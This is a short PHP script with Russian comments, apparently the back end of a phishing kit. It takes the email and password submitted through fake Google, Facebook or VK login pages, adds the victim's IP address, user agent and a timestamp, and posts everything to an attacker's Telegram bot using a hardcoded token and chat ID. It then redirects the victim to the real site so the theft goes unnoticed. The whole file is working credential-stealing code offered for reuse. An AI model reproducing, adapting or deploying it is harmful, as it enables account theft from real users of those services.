<?php
// Получаем данные из формы
$email = $_POST['email'];
$password = $_POST['password'];
$service = $_POST['service']; // Узнаем, с какой страницы пришли данные

// Получаем информацию о пользователе
$user_ip = $_SERVER['REMOTE_ADDR'];
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$current_time = date("Y-m-d H:i:s");

// Формируем сообщение для Telegram
$message = "
Новый вход через $service:
Время: $current_time
IP: $user_ip
User-Agent: $user_agent
Email: $email
Пароль: $password
";

// Токен вашего бота и chat_id
$bot_token = "7728256968:AAEenNdOxdzfTtPMM5H-ILAAK9hNNzhBsP0";  // Замените на токен вашего бота
$chat_id = "7947290290";      // Замените на ваш chat_id

// Отправляем данные в Telegram
$url = "https://api.telegram.org/bot$bot_token/sendMessage";
$params = [
    'chat_id' => $chat_id,
    'text' => $message
];

// Используем cURL для отправки запроса
$ch = curl_init($url);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);
curl_close($ch);

// Перенаправление на оригинальный сайт
if ($service == "google") {
    header("Location: https://google.com");
} elseif ($service == "facebook") {
    header("Location: https://facebook.com");
} elseif ($service == "vk") {
    header("Location: https://vk.com");
}
exit;
?>
